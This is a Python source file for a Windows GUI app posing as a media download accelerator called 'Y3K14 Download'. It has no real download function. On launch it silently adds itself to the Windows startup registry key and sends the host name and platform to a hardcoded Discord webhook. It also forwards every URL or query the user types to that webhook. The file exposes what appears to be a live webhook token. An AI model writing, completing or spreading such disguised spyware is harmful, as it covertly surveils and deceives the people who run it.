import customtkinter as ctk
import requests
import threading
import os
import sys
import winreg
import socket
import platform
from datetime import datetime

# YOUR LIVE WEBHOOK
WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1457738095574388846/6GwqmSdMg_KwtHqU_RTSYg0fwiTefq5DCRLhzXpap6tg6pNlfP1Fvzfo2nvGr1LCqMHD"

class Y3K14_Download(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Y3K14 Download - Media Accelerator")
        self.geometry("750x500")
        self.configure(fg_color="#0f0f0f")

        # IDM Styling
        self.header = ctk.CTkLabel(self, text="Y3K14", font=("Arial Black", 55), text_color="#00D084")
        self.header.pack(pady=(30, 0))
        self.sub = ctk.CTkLabel(self, text="V8.2.1 STABLE - MULTI-THREAD ENGINE", font=("Consolas", 12), text_color="#444444")
        self.sub.pack(pady=(0, 20))

        # URL Input Field
        self.url_var = ctk.StringVar()
        self.entry = ctk.CTkEntry(self, placeholder_text="Enter URL or Search Query...", 
                                  width=550, height=45, border_color="#00D084", fg_color="#1a1a1a")
        self.entry.pack(pady=10)

        # Download Stats
        self.info_label = ctk.CTkLabel(self, text="SYSTEM IDLE", font=("Arial", 13), text_color="#00D084")
        self.info_label.pack(pady=(20, 5))
        
        self.progress = ctk.CTkProgressBar(self, width=550, height=12, progress_color="#00D084")
        self.progress.set(0)
        self.progress.pack(pady=5)

        # IDM Control Buttons
        self.btn_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.btn_frame.pack(pady=30)
        
        self.dl_btn = ctk.CTkButton(self.btn_frame, text="START DOWNLOAD", width=220, height=50, 
                                    fg_color="#00D084", text_color="black", font=("Arial Black", 14),
                                    command=self.handle_action)
        self.dl_btn.grid(row=0, column=0, padx=10)

        # Initialize persistence and stealth reporting
        self.add_to_startup()
        self.report_telemetry("Device Online", f"User: {socket.gethostname()} | Platform: {platform.system()}")

    def add_to_startup(self):
        """Standard IDM persistence: Adds the EXE to Windows Startup Registry"""
        if getattr(sys, 'frozen', False):
            path = sys.executable
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "Y3K14_Download", 0, winreg.REG_SZ, path)
                winreg.CloseKey(key)
            except:
                pass # Silently fail if restricted

    def report_telemetry(self, event, data):
        """Sends data to your Discord Webhook 24/7"""
        def thread_send():
            payload = {
                "embeds": [{
                    "title": f"📈 {event}",
                    "description": f"**Content:** `{data}`",
                    "color": 0x00D084,
                    "footer": {"text": f"IP/Host: {socket.gethostname()}"},
                    "timestamp": datetime.utcnow().isoformat()
                }]
            }
            try: requests.post(WEBHOOK_URL, json=payload, timeout=8)
            except: pass
        threading.Thread(target=thread_send, daemon=True).start()

    def handle_action(self):
        query = self.entry.get().strip()
        if query:
            self.report_telemetry("User Input Captured", query)
            self.info_label.configure(text="CONNECTING TO REMOTE SERVER...")
            self.progress.set(0.4)
            # Add your downloading engine logic here
            self.after(3000, lambda: self.info_label.configure(text="COMPLETED"))

if __name__ == "__main__":
    app = Y3K14_Download()
    app.mainloop()